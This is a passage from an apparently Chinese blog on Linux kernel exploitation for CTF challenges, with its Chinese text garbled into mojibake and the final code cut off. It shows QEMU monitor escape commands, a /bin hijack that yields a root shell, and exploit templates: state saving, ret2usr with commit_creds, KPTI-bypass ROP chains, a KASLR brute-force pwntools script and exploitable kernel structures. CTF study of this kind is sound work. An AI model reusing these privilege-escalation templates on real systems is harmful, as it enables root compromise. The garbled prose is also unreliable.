      <p>poweroff_cmdæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¯ä»¥ç›´æ¥è·å–åœ°å€ç„¶åä¿®æ”¹ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨nmå‘½ä»¤æ¥è·å–ï¼Œæˆ–è€…ç›´æ¥è¿›å…¥gdbæ‰“å°å³å¯ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png" alt="image-20211021105456058"></p>
<p>æ­¤å¤–orderly_poweroffä¹Ÿæ˜¯ä¸€æ ·çš„è·å–ã€‚å¦‚æœæ— æ³•æŸ¥åˆ°ï¼Œé‚£ä¹ˆå¯ä»¥å¯åŠ¨qemuï¼Œå…ˆè®¾ç½®ä¸ºrootæƒé™å</p>
<p><code>cat /proc/kallsyms | grep &quot;orderly_poweroff&quot;</code>å³å¯ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png" alt="image-20211021105603666"></p>
<p><code>poweroff_work_fun</code>å‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„è·å–æ–¹å¼</p>

        <h1 id="ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼"   >
          <a href="#ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼" class="headerlink" title="ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼"></a>ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼</h1>
      
        <h2 id="1-QEMUé€ƒé€¸"   >
          <a href="#1-QEMUé€ƒé€¸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-QEMUé€ƒé€¸" class="headerlink" title="1.QEMUé€ƒé€¸"></a>1.QEMUé€ƒé€¸</h2>
      <p>å½“æ²¡æœ‰å…³é—­monitoræ—¶ï¼Œå¯ä»¥ç›´æ¥ctrl+A Cè¿›å»é€ƒé€¸ï¼Œè§£å‹rootfs.imgè¯»flag</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with id(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-æƒé™åŠç›¸å…³é…ç½®é—®é¢˜"   >
          <a href="#2-æƒé™åŠç›¸å…³é…ç½®é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æƒé™åŠç›¸å…³é…ç½®é—®é¢˜" class="headerlink" title="2.æƒé™åŠç›¸å…³é…ç½®é—®é¢˜"></a>2.æƒé™åŠç›¸å…³é…ç½®é—®é¢˜</h2>
      <p>æœ‰çš„æ ¹ç›®å½•æˆ–è€…binç›®å½•çš„æ‰€æœ‰è€…ä¸æ˜¯rootæ—¶</p>

        <h3 id="1-binç›®å½•ä¸ä¸ºROOT"   >
          <a href="#1-binç›®å½•ä¸ä¸ºROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-binç›®å½•ä¸ä¸ºROOT" class="headerlink" title="(1)binç›®å½•ä¸ä¸ºROOT"></a>(1)binç›®å½•ä¸ä¸ºROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png" alt="image-20220302114830086"></p>
<p>è¿™æ ·å¯ä»¥ä¿®æ”¹biné‡Œé¢çš„å‘½ä»¤ï¼Œè€Œinitè„šæœ¬åœ¨é€€å‡ºæ—¶ï¼Œé€šå¸¸åŒ…å«poweroffå‘½ä»¤ï¼Œæˆ–è€…umountå‘½ä»¤ï¼Œè€Œinitè¿è¡Œæ—¶æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™äº›å‘½ä»¤ä»è€Œåœ¨è¾“å…¥exitå‘½ä»¤è°ƒç”¨initä¸­åœ¨setsidå‰©ä¸‹çš„å‘½ä»¤æ—¶æ¥ç›´æ¥cat flagæˆ–è€…è·å¾—shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png" alt="image-20220302114945940"></p>

        <h3 id="2-æ ¹ç›®å½•ä¸ä¸ºROOT"   >
          <a href="#2-æ ¹ç›®å½•ä¸ä¸ºROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ¹ç›®å½•ä¸ä¸ºROOT" class="headerlink" title="(2)æ ¹ç›®å½•ä¸ä¸ºROOT"></a>(2)æ ¹ç›®å½•ä¸ä¸ºROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png" alt="image-20220302115207278"></p>
<p>é‚£ä¹ˆåœ¨æ ¹ç›®å½•ä¸‹ï¼Œè™½ç„¶binçš„æ‰€æœ‰è€…ä¸ºrootï¼Œä½†æ˜¯ç¼ºå¯ä»¥å¯¹binè¿›è¡Œæ”¹åï¼Œç„¶åæˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªbinç›®å½•ï¼Œé‡Œé¢æ”¾ä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‘½ä»¤ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»¥rootæƒé™è°ƒç”¨è¿™ä¸ªä¼ªé€ çš„å‘½ä»¤äº†ï¼Œå¦‚ä¸‹ä¸ºæ‰€ç¤ºä¾‹å­ã€‚</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv bin evil_bin</span><br><span class="line">mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-å¯†ç æœªè®¾ç½®"   >
          <a href="#3-å¯†ç æœªè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¯†ç æœªè®¾ç½®" class="headerlink" title="(3)å¯†ç æœªè®¾ç½®"></a>(3)å¯†ç æœªè®¾ç½®</h3>
      <p>å¦‚æœrootè´¦å·çš„å¯†ç æ²¡æœ‰è®¾ç½®çš„è¯ï¼Œç›´æ¥suå³å¯ç™»å½•åˆ°rootï¼Œéé¢„æœŸçš„ã€‚</p>

        <h1 id="å…«ã€æ¨¡æ¿"   >
          <a href="#å…«ã€æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…«ã€æ¨¡æ¿" class="headerlink" title="å…«ã€æ¨¡æ¿"></a>å…«ã€æ¨¡æ¿</h1>
      
        <h2 id="1-ä¿å­˜çŠ¶æ€"   >
          <a href="#1-ä¿å­˜çŠ¶æ€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿å­˜çŠ¶æ€" class="headerlink" title="1.ä¿å­˜çŠ¶æ€"></a>1.ä¿å­˜çŠ¶æ€</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-ç”¨æˆ·æ€èµ·Shell"   >
          <a href="#2-ç”¨æˆ·æ€èµ·Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç”¨æˆ·æ€èµ·Shell" class="headerlink" title="2.ç”¨æˆ·æ€èµ·Shell"></a>2.ç”¨æˆ·æ€èµ·Shell</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-è¿”å›ç”¨æˆ·æ€"   >
          <a href="#3-è¿”å›ç”¨æˆ·æ€" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è¿”å›ç”¨æˆ·æ€" class="headerlink" title="3.è¿”å›ç”¨æˆ·æ€"></a>3.è¿”å›ç”¨æˆ·æ€</h2>
      
        <h3 id="1-æ²¡æœ‰KPTI"   >
          <a href="#1-æ²¡æœ‰KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ²¡æœ‰KPTI" class="headerlink" title="(1)æ²¡æœ‰KPTI"></a>(1)æ²¡æœ‰KPTI</h3>
      <p>æ­£å¸¸çš„swapgså’Œiretq</p>
<p>ROPå¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs_ret</span><br><span class="line">iretq</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å­˜åœ¨KPTI"   >
          <a href="#2-å­˜åœ¨KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å­˜åœ¨KPTI" class="headerlink" title="(2)å­˜åœ¨KPTI"></a>(2)å­˜åœ¨KPTI</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä»<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°æŸå¤„å¼€å§‹æ‰§è¡Œ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rdi,rsp   //è¯¥å¤„å¼€å§‹æ‰§è¡Œ</span><br><span class="line">mov    rsp,QWORD PTR gs:0x6004</span><br></pre></td></tr></table></div></figure>

<p>ROPå¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode+22,</span><br><span class="line">0,</span><br><span class="line">0,</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-çˆ†ç ´KASLR"   >
          <a href="#4-çˆ†ç ´KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-çˆ†ç ´KASLR" class="headerlink" title="4.çˆ†ç ´KASLR"></a>4.çˆ†ç ´KASLR</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-POCé‡Œ"   >
          <a href="#1-POCé‡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-POCé‡Œ" class="headerlink" title="(1)POCé‡Œ"></a>(1)POCé‡Œ</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROP[i++] = POP_RDI_RET + offset;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">ROP[i++] = COMMIT_CREDS + offset;</span><br><span class="line">ROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-æ‰“è¿œç¨‹çš„EXP"   >
          <a href="#2-æ‰“è¿œç¨‹çš„EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ‰“è¿œç¨‹çš„EXP" class="headerlink" title="(2)æ‰“è¿œç¨‹çš„EXP"></a>(2)æ‰“è¿œç¨‹çš„EXP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line">    </span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="5-retUsræ¨¡æ¿"   >
          <a href="#5-retUsræ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-retUsræ¨¡æ¿" class="headerlink" title="5.retUsræ¨¡æ¿"></a>5.retUsræ¨¡æ¿</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));    <span class="comment">// ä¿å­˜çŠ¶æ€çš„ç»“æ„ä½“</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">status</span>;</span>     <span class="comment">// ä¿å­˜çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†çŠ¶æ€ä¿å­˜åœ¨statusä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span>                  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %%ss, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsp, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%cs, %3\n&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(status.ss),<span class="string">&quot;=r&quot;</span>(status.rsp),<span class="string">&quot;=r&quot;</span>(status.rflags),<span class="string">&quot;=r&quot;</span>(status.cs)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">    status.rip = shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retUsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $status,%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“"   >
          <a href="#ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“" class="headerlink" title="ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“"></a>ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“</h1>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024"   >
          <a href="#1-ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024" class="headerlink" title="1.ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024"></a>1.ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024</h2>
      <p>æ‰“å¼€è®¾å¤‡ï¼š<code>/dev/ptmx</code></p>
<p>tty_struct çš„é­”æ•°ä¸º <code>0x5401</code>ï¼Œä½äºè¯¥ç»“æ„ä½“çš„å¼€å¤´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¯¹è¯¥é­”æ•°çš„æœç´¢ä»¥é”å®šè¯¥ç»“æ„ä½“ã€‚</p>
<p>ä¸Šé¢<strong>å †-&gt;å€ŸåŠ©ptmxè®¾å¤‡</strong>è®²è¿‡äº†</p>

        <h2 id="2-seq-operationsç»“æ„ä½“â€”-kmalloc-32"   >
          <a href="#2-seq-operationsç»“æ„ä½“â€”-kmalloc-32" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-seq-operationsç»“æ„ä½“â€”-kmalloc-32" class="headerlink" title="2.seq_operationsç»“æ„ä½“â€”-kmalloc-32"></a>2.seq_operationsç»“æ„ä½“â€”-kmalloc-32</h2>
      <p>æ‰“å¼€è®¾å¤‡ï¼š<code>proc/self/stat</code></p>
<p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œå¤§å°ä¸º0x20</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡å‡½æ•°æŒ‡é’ˆæ³„éœ²åœ°å€ï¼Œå†åŠ«æŒstartå‡½æ•°æŒ‡é’ˆåå¯¹è¯¥è®¾å¤‡è¿›è¡Œè¯»å†™å³å¯è°ƒç”¨åŠ«æŒçš„startå‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶ç¨‹åºæµç¨‹ã€‚è¯»å†™çš„æ—¶å€™å¯é€šè¿‡syscallåˆ›å»º<code>pt_regs</code>ç»“æ„ä½“æ¥å¸ƒç½®å†…æ ¸æ ˆç¯å¢ƒï¼Œç„¶åé€šè¿‡<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°è¿”å›ç”¨æˆ·ç©ºé—´ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >è¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›easykernelé¢˜è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="3-subprocess-infoç»“æ„ä½“â€”kmalloc-128"   >
          <a href="#3-subprocess-infoç»“æ„ä½“â€”kmalloc-128" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-subprocess-infoç»“æ„ä½“â€”kmalloc-128" class="headerlink" title="3.subprocess_infoç»“æ„ä½“â€”kmalloc-128"></a>3.subprocess_infoç»“æ„ä½“â€”kmalloc-128</h2>
      <p>é€šè¿‡ä»¥ä¸‹è¯­å¥å¯ä»¥åˆ†é…å¾—åˆ°ä¸€ä¸ª<code>subprocess_info</code>ç»“æ„ä½“ï¼Œä¸åŒç‰ˆæœ¬å¤§å°ä¸åŒï¼Œå¦‚ä¸‹ç‰ˆæœ¬å½¢å¼çš„ä¸º0x60ï¼Œä½¿ç”¨kmalloc-128åˆ†é…å™¨</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>

<p>ç»“æ„ä½“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span 